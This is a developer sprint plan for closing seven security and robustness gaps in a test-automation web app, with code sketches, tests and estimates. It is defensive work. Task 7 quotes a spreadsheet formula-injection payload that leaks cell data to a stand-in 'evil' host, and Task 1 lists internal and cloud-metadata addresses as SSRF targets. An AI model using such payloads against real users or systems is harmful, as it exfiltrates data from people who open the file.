# Sprint 1 — Security & Critical Robustness

**Goal:** Close seven concrete security / robustness holes identified in the
2026-05-19 review. All tasks are small, low-coupling, ship-individually.

**Estimate:** ~28 h work + ~6 h contingency = **~34 h** (≈ 4–5 dev days).

**Scope assumption:** TestForTge runs single-tenant on-prem with optional
HTTP-Basic gate. CSRF + server-side sessions + SECRET_KEY + 64MB upload cap
are already in place — these gaps are what's left.

---

## Suggested commit order

Each commit reviewable in isolation, CI-green individually. Order goes from
smallest/safest to most disruptive UX-wise.

1. `exporter: sanitize CSV/XLSX cells against formula injection` — Task 7
2. `engine: add llm_client wrapper with timeout + tenacity retries` — Task 6
3. `engine: add SSRF allowlist and gate all goto/urlopen sites` — Task 1
4. `automation: tighten browser-context lifecycle with try/finally` — Task 3
5. `runner_worker: handle SIGTERM/SIGINT, write error.flag` — Task 4 (depends on Task 3)
6. `routes: enforce per-session concurrency cap (MAX_CONCURRENT_RUNS=3)` — Task 5
7. `routes/projects: require owner_sid on load/delete/select/move` — Task 2

---

## Task 1 — SSRF allowlist

**Rationale.** `page.goto()` accepts whatever URL the operator types in a
requirement or base URL. On an on-prem box, that goto can hit
`http://127.0.0.1:5000/admin`, `http://192.168.1.1`, or
`http://169.254.169.254/latest/meta-data/` (cloud metadata) and exfiltrate
screenshots/video of internal services through our own bug-report pipeline.

**Files.**
- NEW `engine/security.py` (~120 lines)
- `engine/automation_runner.py` — wrap lines 757 (step goto), 1459 (login goto), 1520 (register goto)
- `engine/browser_tester.py` — wrap all `page.goto` sites (lines 153, 167, 227, 270, 357, 416, 495, 601, 678, 753, 792)
- `engine/site_crawler.py` line 320 (`urllib.request.urlopen`)
- `engine/site_tester.py` lines 402, 481 (`urlopen`)
- `engine/mockup_vision.py` lines 182, 201, 214, 228, 237 (`requests.get`)
- `config.py` — add `SSRF_ALLOWLIST_BYPASS` env flag for opt-out

**Sketch.**
```python
# engine/security.py
import ipaddress, socket, os
from urllib.parse import urlparse

_BLOCKED_NETS = [ipaddress.ip_network(n) for n in (
    "127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12",
    "192.168.0.0/16", "169.254.0.0/16", "0.0.0.0/8",
    "::1/128", "fc00::/7", "fe80::/10",
)]
_ALLOWED_SCHEMES = {"http", "https"}

class UnsafeUrlError(ValueError): pass

def is_safe_external_url(url: str) -> bool:
    try:
        p = urlparse((url or "").strip())
    except Exception:
        return False
    if p.scheme.lower() not in _ALLOWED_SCHEMES:
        return False
    host = (p.hostname or "").lower()
    if not host or host in {"localhost", "ip6-localhost", "ip6-loopback"}:
        return False
    try:
        infos = socket.getaddrinfo(host, p.port, proto=socket.IPPROTO_TCP)
    except socket.gaierror:
        return False
    for fam, _, _, _, sockaddr in infos:
        ip = ipaddress.ip_address(sockaddr[0])
        if ip.is_private or ip.is_loopback or ip.is_link_local \
                or ip.is_reserved or ip.is_multicast or ip.is_unspecified:
            return False
        for net in _BLOCKED_NETS:
            if ip in net:
                return False
    return True

def require_safe_url(url: str) -> None:
    if os.environ.get("SSRF_ALLOWLIST_BYPASS") == "1":
        return
    if not is_safe_external_url(url):
        raise UnsafeUrlError(f"URL blocked by SSRF policy: {url!r}")
```

In `automation_runner._run_step` near line 757:
```python
if step.action == "goto":
    from engine.security import require_safe_url, UnsafeUrlError
    try:
        require_safe_url(target_url)
    except UnsafeUrlError as exc:
        raise AssertionError(str(exc))   # surfaces as failed step
    page.goto(target_url, wait_until="domcontentloaded")
```

For `_authenticate` (1459) and `_attempt_register` (1520) — same guard, but on
failure mark `sr.status = "blocked"` with reason rather than raising
(registration is best-effort).

**Tests** — `tests/test_security.py`:
1. `test_blocks_localhost_variants` — `127.0.0.1`, `localhost`, `[::1]`, `127.1`.
2. `test_blocks_rfc1918_and_link_local` — `10.0.0.5`, `192.168.1.1`, `169.254.169.254`.
3. `test_dns_rebinding_blocked` — monkeypatch `socket.getaddrinfo` to return a private IP for a public name.
4. `test_allows_public_https` — passes for `example.com`.
5. `test_step_goto_marks_failed` — integration; step targeting `127.0.0.1` produces `status=="failed"` with comment "blocked by SSRF policy".

**Risks.** Operators using staging on `192.168.x` will see runs fail. Mitigation:
`SSRF_ALLOWLIST_BYPASS=1` documented in CHANGELOG. `mockup_vision.requests.get`
calls hit external images — same guard so `og:image` URL pointing to
`http://127.0.0.1` can't trigger fetch.

**Estimate:** 5 h. **Depends on:** nothing.

---

## Task 2 — Owner_sid authorization on project routes

**Rationale.** Any logged-in session can hit `GET /load-project/<id>` or
`POST /delete-project/<id>` and read/destroy another user's data. DB schema
already has `owner_sid` (`engine/db.py:198`); routes never check it.

**Files.**
- `routes/projects.py` — gate routes at lines 132 (`load_project`), 164 (`delete_project`), 214 (`db_select_project`), 333 (`db_rename_project`), 369 (`db_move_artifacts` — must check source AND target)
- `engine/db.py` — add thin `get_project_owner(project_id) -> str | None`
- One-time migration: `NULL owner_sid` projects allowed (legacy public) with warning, fix in Sprint 2

**Sketch.**
```python
# routes/projects.py — near top with other helpers
def _require_project_owner(project_id: str):
    if not _is_valid_project_id(project_id):
        abort(400)
    meta = _db.get_project(project_id)
    if not meta:
        return None
    owner = meta.get("owner_sid")
    if owner and owner != get_session_id():
        log.warning("project access denied pid=%s owner=%s sid=%s",
                    project_id[:8], (owner or "")[:8],
                    get_session_id()[:8])
        abort(403)
    if not owner:
        log.info("project pid=%s has NULL owner_sid — allowing (legacy)",
                 project_id[:8])
    return meta
```

For `db_move_artifacts` (line 369): call `_require_project_owner` on BOTH
source and target — otherwise an attacker could move their own artefacts into
a victim's project.

**Tests** — `tests/test_projects_auth.py`:
1. `test_load_project_other_owner_returns_403`.
2. `test_delete_project_other_owner_returns_403`.
3. `test_legacy_null_owner_allows_access` — with warning logged.
4. `test_move_artifacts_blocks_cross_owner_target`.

**Risks.** Existing sessions that lost their cookie now see 403 on previously
owned projects. Mitigation: `ensure_active_project` rehydrates via `owner_sid`
lookup, so SID is sticky as long as `SECRET_KEY` is preserved.

**Estimate:** 4 h. **Depends on:** nothing.

---

## Task 3 — Browser context try/finally

**Rationale.** `automation_runner._run_script` at line 608 creates
`context = browser.new_context(**ctx_kwargs)`, then lines 609–675 do
`new_page()`, init scripts, login. If anything throws before the surrounding
`try` at line 676, the `finally: context.close()` at line 690 never runs.
Chromium contexts leak — on 512 MB dyno this causes OOM-kill after ~4 leaked
contexts.

**Files.** `engine/automation_runner.py` lines 608–697 only.

**Sketch.**
```python
context = browser.new_context(**ctx_kwargs)
try:
    page = context.new_page()
    if not self.headless:
        try: page.bring_to_front()
        except Exception: pass
    page.set_default_timeout(self.default_timeout_ms)
    page.set_default_navigation_timeout(self.navigation_timeout_ms)
    page.on("console", lambda msg: console_errors.append(msg.text)
            if msg.type == "error" else None)
    page.on("pageerror", lambda exc: console_errors.append(str(exc)))
    # ... cursor injection, _authenticate, step loop ...
    t_script = time.time()
    try:
        for i, step in enumerate(script.steps, start=1):
            sr = self._run_step(page, step, i, tc_dir)
            sr.console_errors = list(console_errors)
            result.steps.append(sr)
            if sr.status in ("failed", "blocked"):
                result.status = sr.status
                result.comment = f"{sr.status.title()} at step {i}: {sr.comment}"
                break
        result.final_url = page.url
    except BaseException:
        result.status = "failed"
        if not result.comment:
            result.comment = "Script aborted unexpectedly."
        raise
finally:
    try:
        video = page.video if 'page' in dir() else None
    except Exception:
        video = None
    try:
        context.close()
    except Exception:
        pass
    if video and self.record_video:
        try:
            result.video_path = _rel_url(video.path(), self.storage_root)
        except Exception:
            pass
```

**Tests** — `tests/test_automation_unit.py`:
1. `test_context_closed_on_new_page_failure` — stub browser whose `new_page` raises.
2. `test_context_closed_on_authenticate_failure`.
3. `test_video_path_resolved_when_steps_complete`.

**Estimate:** 3 h. **Depends on:** nothing. **Blocks:** Task 4.

---

## Task 4 — SIGTERM handler in runner_worker.py

**Rationale.** Per worker's docstring at line 19, `done.flag` is the polling
signal. If gunicorn/host kills the subprocess via SIGTERM, the `finally:` at
`runner_worker.py:331` runs only on `KeyboardInterrupt`, not on bare SIGTERM.
UI then waits 120 s for stall detection, surfaces "stalled" — operator sees no
actionable error.

**Files.**
- `engine/runner_worker.py` — signal handlers in `main()`
- `engine/automation_runner.py` — module-level `_CURRENT_BROWSER` handle set after `browser = launch()`
- `routes/execution.py:1922` — handle `error.flag` in `test_execution_run_status`

**Sketch.**
```python
# engine/runner_worker.py — inside main()
import signal as _signal

def _on_terminate(signum, frame):
    try:
        from engine import automation_runner as _ar
        b = getattr(_ar, "_CURRENT_BROWSER", None)
        if b is not None:
            try: b.close()
            except Exception: pass
    except Exception:
        pass
    try:
        err_path = os.path.join(pending_dir, f"{config_id}.error.flag")
        with open(err_path, "w", encoding="utf-8") as f:
            f.write(f"terminated by signal {signum} at "
                    f"{datetime.now(timezone.utc).isoformat()}")
    except Exception:
        pass
    try:
        payload = {"status": "terminated", "config_id": config_id,
                   "error": f"Worker killed by signal {signum}",
                   "finished_at": datetime.now(timezone.utc).isoformat()}
        tmp = result_path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(payload, f)
        os.replace(tmp, result_path)
    except Exception:
        pass
    try:
        with open(done_path, "w", encoding="utf-8") as f:
            f.write(datetime.now(timezone.utc).isoformat())
    except Exception:
        pass
    sys.exit(143 if signum == _signal.SIGTERM else 130)

if hasattr(_signal, "SIGTERM"):
    _signal.signal(_signal.SIGTERM, _on_terminate)
_signal.signal(_signal.SIGINT, _on_terminate)
```

In `routes/execution.py:1926`:
```python
error_path = os.path.join(pending_dir, f"{run_id}.error.flag")
if os.path.isfile(error_path) and os.path.isfile(done_path):
    return jsonify({"status": "terminated",
                    "error": open(error_path).read()[:500]})
```

**Tests** — `tests/test_runner_worker.py` (new):
1. `test_sigterm_writes_error_flag_and_done` — spawn `python -m engine.runner_worker`, send SIGTERM, assert flags + `result.json` has `status=="terminated"`.
2. `test_sigint_same_path`.
3. `test_run_status_surfaces_terminated`.

**Risks.** Windows has no SIGTERM equivalent in some Python versions — guard
with `if hasattr(signal, "SIGTERM")`. Worker is only spawned on Linux Render
boxes; dev on Windows uses sync path.

**Estimate:** 5 h. **Depends on:** Task 3.

---

## Task 5 — Concurrency cap per session

**Rationale.** `JobQueue.count_active_by_meta` (`engine/job_queue.py:198-214`)
exists for exactly this but is never called. A single user can submit
`/test-cases`, `/test-execution`, `/estimation/run` repeatedly and exhaust
the 2-worker pool plus saturate disk with `_pending/*.json`.

**Files.**
- `routes/execution.py` line 1018 — wrap subprocess dispatch with active-runs check
- `routes/generation.py` line 230 — precede `get_queue().submit("tc_gen", …)` with check
- `routes/estimation.py` — same pattern
- `engine/job_queue.py` — add `count_active_subprocess_runs(pending_dir, session_id)` helper
- `config.py` — `MAX_CONCURRENT_RUNS = int(os.environ.get("MAX_CONCURRENT_RUNS", "3"))`

**Sketch.**
```python
# routes/generation.py — before line 230:
sid = get_session_id(session)
active = get_queue().count_active_by_meta("tc_gen", "session_id", sid)
if active >= current_app.config["MAX_CONCURRENT_RUNS"]:
    flash(
        f"You already have {active} generation jobs running. "
        f"Please wait for them to finish before starting another.",
        "warning",
    )
    return redirect(url_for("test_cases_page"))
job_id = get_queue().submit("tc_gen", _sync_worker, meta={"session_id": sid})
```

For subprocess path in `routes/execution.py:1018`:
```python
# engine/job_queue.py
def count_active_subprocess_runs(pending_dir: str, session_id: str) -> int:
    if not os.path.isdir(pending_dir):
        return 0
    n = 0
    for fn in os.listdir(pending_dir):
        if not fn.endswith(".json") or fn.endswith(".result.json"):
            continue
        rid = os.path.splitext(fn)[0]
        if os.path.isfile(os.path.join(pending_dir, f"{rid}.done.flag")):
            continue
        try:
            with open(os.path.join(pending_dir, fn), "r", encoding="utf-8") as f:
                cfg = json.load(f)
            if cfg.get("session_id") == session_id:
                n += 1
        except Exception:
            continue
    return n
```

**Tests** — `tests/test_concurrency_cap.py`:
1. `test_third_submit_blocked`.
2. `test_different_sessions_isolated`.
3. `test_subprocess_cap_counts_pending_only` — done.flag → not counted.

**Estimate:** 4 h. **Depends on:** nothing.

---

## Task 6 — LLM timeouts and retry

**Rationale.** `engine/chatbot.py:1081` calls `client.messages.create` with no
timeout — a hung Anthropic API call locks one of the JobQueue workers (or
the Flask request thread). Anthropic SDK default ~10 min timeout; we want hard
60 s with retries.

**Note correcting earlier plan.** `testcase_generator.py` and
`user_story_generator.py` are rule-based — no `messages.create` there. Only
chatbot.py and mockup_vision.py call Anthropic.

**Files.**
- NEW `engine/llm_client.py` (~80 lines)
- `engine/chatbot.py` lines 1076–1103 — replace direct Anthropic call
- `engine/mockup_vision.py` lines 295–309 — same replacement
- `requirements.txt` — add `tenacity` (latest stable)

**Sketch.**
```python
# engine/llm_client.py
import os
import anthropic
from tenacity import (retry, stop_after_attempt, wait_exponential,
                       retry_if_exception_type, before_sleep_log)
import logging

log = logging.getLogger(__name__)

_TIMEOUT_S = float(os.environ.get("ANTHROPIC_TIMEOUT_S", "60"))
_RETRY_EXC = (
    anthropic.APIConnectionError,
    anthropic.APITimeoutError,
    anthropic.RateLimitError,
    anthropic.InternalServerError,
)

class LLMUnavailable(RuntimeError): pass

@retry(stop=stop_after_attempt(3),
       wait=wait_exponential(multiplier=1, min=1, max=4),
       retry=retry_if_exception_type(_RETRY_EXC),
       reraise=True,
       before_sleep=before_sleep_log(log, logging.WARNING))
def _create(client, **kwargs):
    return client.messages.create(timeout=_TIMEOUT_S, **kwargs)

def call_messages(*, model, max_tokens, system, messages, api_key=None):
    key = (api_key or os.environ.get("ANTHROPIC_API_KEY") or "").strip()
    if not key:
        raise LLMUnavailable("ANTHROPIC_API_KEY not set")
    client = anthropic.Anthropic(api_key=key)
    try:
        return _create(client, model=model, max_tokens=max_tokens,
                        system=system, messages=messages)
    except _RETRY_EXC as exc:
        raise LLMUnavailable(f"after retries: {type(exc).__name__}: {exc}")
```

In `chatbot.py`:
```python
try:
    resp = llm_client.call_messages(
        model=_ANTHROPIC_MODEL, max_tokens=_ANTHROPIC_MAX_TOKENS,
        system=_ai_system_prompt(lang),
        messages=[{"role": "user", "content": message}],
    )
except llm_client.LLMUnavailable as exc:
    _logger.warning("AI chatbot unavailable: %s", exc)
    return None   # falls through to rule-based dispatcher
```

**Tests** — `tests/test_llm_client.py`:
1. `test_retries_on_api_timeout` — succeed on 3rd attempt.
2. `test_gives_up_after_three_attempts`.
3. `test_missing_api_key_raises_llm_unavailable_immediately`.
4. `test_timeout_kwarg_propagates`.

**Estimate:** 4 h. **Depends on:** nothing.

---

## Task 7 — CSV/Excel formula injection

**Rationale.** Operator-controlled fields (TC summary, steps, expected_result,
comment, checklist objective/comments) flow verbatim into CSV
(`exporter.py:200–219`) and XLSX (`317–323, 381–385`). A user enters
`=HYPERLINK("http://evil/?leak="&A1, "click")` as a comment; another user
opens the exported CSV in Excel and the formula runs.

**Files.** `engine/exporter.py` only.

**Sketch.**
```python
# top of engine/exporter.py
_RISKY_CELL_PREFIX = ("=", "+", "-", "@", "|", "\t", "\r")

def _sanitize_cell(val):
    """Prepend a leading apostrophe to values that Excel/Sheets would
    interpret as a formula. Apostrophe is stripped on display."""
    if val is None:
        return ""
    s = str(val)
    if s and s[0] in _RISKY_CELL_PREFIX:
        return "'" + s
    return s
```

Apply in:
- `export_csv_testcases` (200–209)
- `export_csv_checklist` (212–218)
- `export_xlsx_testcases` cell-write loop (326)
- `export_xlsx_checklist` cell-write loop (388)
- any other CSV/XLSX exporter (`export_csv_bugs` etc. — grep before edit)

**Tests** — `tests/test_exporter_injection.py`:
1. `test_csv_sanitizes_leading_equals`.
2. `test_csv_sanitizes_at_pipe_tab`.
3. `test_xlsx_cell_value_starts_with_apostrophe`.
4. `test_benign_values_unchanged`.

**Risks.** Cells starting with `-` are common in steps ("- Click Login").
Apostrophe prefix is invisible in Excel but VISIBLE in plain-text editors and
Pandas reads. Document in CHANGELOG.

**Estimate:** 3 h. **Depends on:** nothing.

---

## What to defer to Sprint 2 if overruns

Drop in this order (least security-critical first):
- **Task 3 (try/finally refactor)** — leaks observable only under repeated failure; OOM-kill already monitored by stall detection in `execution.py:1937–1967`.
- **Task 5 (concurrency cap)** — DoS by a single authenticated user on an on-prem deploy is low-likelihood.
- **NULL owner_sid backfill** — Task 2 leaves this as a follow-up by design.

Never defer Task 1, 2, 4, 7 — those are the user-facing security holes
(SSRF to cloud metadata, cross-tenant project read, stuck UI on signal kill,
CSV macro RCE on the recipient).
